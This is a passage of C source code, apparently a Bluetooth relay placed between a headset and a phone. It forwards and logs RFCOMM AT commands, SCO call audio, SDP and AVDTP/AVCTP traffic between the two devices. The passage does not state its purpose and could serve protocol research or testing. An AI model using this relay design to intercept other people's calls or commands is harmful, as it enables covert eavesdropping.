				}
				/*else
				{
					printf("Resetting headset conn\n");
					close(sco_sock1);

					sco_sock1 = -1;
				}*/	
			}

			memset(recv_buf, 0, RECV_BUF_SIZE);
		}	

		// 612 - 4b header
		if ((recv_len = read(ag2hs_audio, recv_buf, 608)) > 0)
		{
			//printf("AG2HS_AUDIO: %d bytes\n", recv_len);

			/*if (-1 == audio_sock1)
				audio_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP, &audio_sock1_omtu, &audio_sock1_imtu);*/
		
			/*if (recv_len > audio_sock1_omtu)
			{
				printf("Sending audio fragmented... %d > %d\n", recv_len, audio_sock1_omtu);
				send_l2cap_fragmented(audio_sock1, recv_buf, recv_len, audio_sock1_omtu);
			}
			else*/

			if (recv_len <= audio_sock1_omtu)
			{
				if ((err = send(audio_sock1, recv_buf, recv_len, 0)) < 0) 
				{
					if (errno != EAGAIN && errno != EWOULDBLOCK)
					{
						printf("audio_sock1 send failed %d - %s (%d bytes)\n", errno, strerror(errno), recv_len);	
						break;
					}
				}

				/*audio1_sent_amt += recv_len;

				if (audio1_sent_amt >= 12000)
				{
					audio1_sent_amt = 0;
					sleep(1);
				}*/
			}
			else
			{
				send_l2cap_fragmented(audio_sock1, recv_buf, recv_len, DEFAULT_L2CAP_MTU);
			}

			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != audio_sock1)
		{
			if ((recv_len = recv(audio_sock1, recv_buf, audio_sock1_imtu, 0)) > 0)
			{
				//printf("AUDIO1->AUDIO2: %d bytes\n", recv_len);
				write(hs2ag_audio, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if ((recv_len = read(ag2hs_sdp, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("AG2HS_SDP: %d bytes\n", recv_len);

			if (-1 == sdp_sock1)
				sdp_sock1 = connect_l2cap(dest1_mac, PSM_SDP, &sdp1_omtu, &sdp1_imtu);

			if (send(sdp_sock1, recv_buf, recv_len, 0) < 0) printf("sdp_sock1 send failed\n");
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != sdp_sock1)
		{
			if ((recv_len = recv(sdp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("SDP1->SDP2: %d bytes\n", recv_len);
				write(hs2ag_sdp, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if ((recv_len = read(ag2hs, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("AG2HS: %s\n", recv_buf);

			if (-1 == rfcomm_sock1)
			{
				rfcomm_sock1 = connect_rfcomm(dest1_mac, local_mac, rfcomm_channel1);
				printf("Opened HS RFCOMM connection\n");
			}

			if (send(rfcomm_sock1, recv_buf, recv_len, 0) < 0) printf("rfcomm_sock1 send failed\n");
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if ((recv_len = read(ag2hs_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
		{
//				printf("AG2HS_SCO: %u bytes to SCO!\n", recv_len);
			if (-1 == sco_sock1)
			{
				printf("Connecting SCO to headset!\n");
				sco_sock1 = connect_sco(dest1_mac, local_mac);

				memset(&sco_conn_options, 0, sizeof(struct sco_options));
				optlen = sizeof(struct sco_options);

				if (getsockopt(sco_sock1, SOL_SCO, SCO_OPTIONS, &sco_conn_options, &optlen) < 0)
				{
					printf("Failed to get sock options...\n");
				}

				printf("SCO Link1 mtu: %u\n", sco_conn_options.mtu);
			}

			if (recv_len <= DEFAULT_SCO_MTU)
			{
				if (send(sco_sock1, recv_buf, recv_len, 0) < 0) 
				{
					printf("sco1 send failed(%d - %s) [%d B]\n",
						errno, strerror(errno), recv_len);
					close(sco_sock1);
					sco_sock1 = -1;
				}
				usleep(500);
			}
			else
			{
				send_sco_fragmented(sco_sock1, recv_buf, recv_len, DEFAULT_SCO_MTU);
			}
			
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != sco_sock1)
		{
			if ((recv_len = recv(sco_sock1, recv_buf, DEFAULT_SCO_MTU, 0)) > 0)
			{
				printf("SCO1->SCO2 [%u bytes]\n", recv_len);
				if (write(hs2ag_sco, recv_buf, recv_len) < 0) printf("hs2ag_sco write failed\n");

				memset(recv_buf, 0, RECV_BUF_SIZE); 
			}
		}
	}
	}

	while(1)
	{
/*
		if (sdp_sock_res.res_sock != -1 && !sdp_chann_enabled && 0)
		{
			printf("We have been SDP queried! - %d\n", sdp_sock_res.res_sock);
			sdp_sock2 = sdp_sock_res.res_sock;
			sdp_chann_enabled = 1;
			sdp_sock1 = connect_l2cap(dest1_mac, PSM_SDP);
		}

		if (sdp_chann_enabled)
		{
			if ((recv_len = recv(sdp_sock1, l2cap_buf, 1500, 0)) > 0)
			{
				printf("SDP1->SDP2: %u bytes\n", recv_len);
				send(sdp_sock2, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}

			if ((recv_len = recv(sdp_sock2, l2cap_buf, 1500, 0)) > 0)
			{
				printf("SDP2->SDP1: %u bytes\n", recv_len);
				send(sdp_sock1, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}
		}
*/

		if (sco_conn_enabled)
		{
			if ((recv_len = recv(sco_sock1, l2cap_buf, 1500, 0)) > 0)
			{
				printf("SCO1->SCO2: %u bytes\n", recv_len);
				send(sco_sock2, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}

			if ((recv_len = recv(sco_sock2, l2cap_buf, 1500, 0)) > 0)
			{
				printf("SCO2->SCO1: %u bytes\n", recv_len);
				send(sco_sock1, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}
		}

		if ((recv_len = recv(rfcomm_sock1, recv_buf, sizeof(recv_buf), 0)) > 0)
		{
			printf("RFCOMM1 -> RFCOMM2: %s\n", recv_buf);
			send(rfcomm_sock2, recv_buf, recv_len, 0);
			
			if (NULL != strcasestr(recv_buf, "CLCC"))
			{
				if (!sco_conn_enabled)
				{
					connect_sco_dual(&sco_sock2, local_mac, dest1_mac, &sco_sock1);
				}
				else
				{
					//close(sco_sock1);
					close(sco_sock2);

					sco_sock2 = -1;
				}	
			}

			sco_conn_enabled = (sco_sock1 > 0) && (sco_sock2 > 0);
			memset(recv_buf, 0, sizeof(recv_buf));
		}

		if ((recv_len = recv(rfcomm_sock2, recv_buf, sizeof(recv_buf), 0)) > 0)
		{
			printf("RFCOMM2 -> RFCOMM1: %s\n", recv_buf);
			send(rfcomm_sock1, recv_buf, recv_len, 0);

			if (NULL != strcasestr(recv_buf, "CLCC"))
			{
				if (!sco_conn_enabled)
				{
					connect_sco_dual(&sco_sock1, local_mac, dest2_mac, &sco_sock2);
				}
				else
				{
					//close(sco_sock1);
					close(sco_sock2);

					sco_sock2 = -1;
				}	
			}

			sco_conn_enabled = (sco_sock1 > 0) && (sco_sock2 > 0);
			memset(recv_buf, 0, sizeof(recv_buf));
		}

		if (connected)
			{
			if ((recv_len = recv(avctp_sock1, l2cap_buf, 1500, 0)) > 0)
			{
				printf("AVCTP1 -> AVCTP2: %s\n", l2cap_buf);
				send(avctp_sock2, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}

			if ((recv_len = recv(avctp_sock2, l2cap_buf, 1500, 0)) > 0)
			{
				printf("AVCTP2 -> AVCTP1: %s\n", l2cap_buf);
				send(avctp_sock1, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}

			if ((recv_len = recv(avdtp_sock1, l2cap_buf, 1500, 0)) > 0)
			{
				printf("AVDTP1 -> AVDTP2: %s\n", l2cap_buf);
				send(avdtp_sock2, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}

			if ((recv_len = recv(avdtp_sock2, l2cap_buf, 1500, 0)) > 0)
			{
				printf("AVCTP2 -> AVCTP1: %s\n", l2cap_buf);
				send(avdtp_sock1, l2cap_buf, recv_len, 0);
				memset(l2cap_buf, 0, 1500);
			}
		}

		//sleep(1);
	}

l2cap_sock_cleanup:

	close(avctp_sock1);
	close(avdtp_sock1);
	close(avctp_sock2);
	close(avdtp_sock2);

rfcomm_sock_cleanup:

	close(rfcomm_sock1);
	close(rfcomm_sock2);

cleanup:

	free(l2cap_buf);
	free(recv_buf);

	hci_close_dev(dev_sock);
}
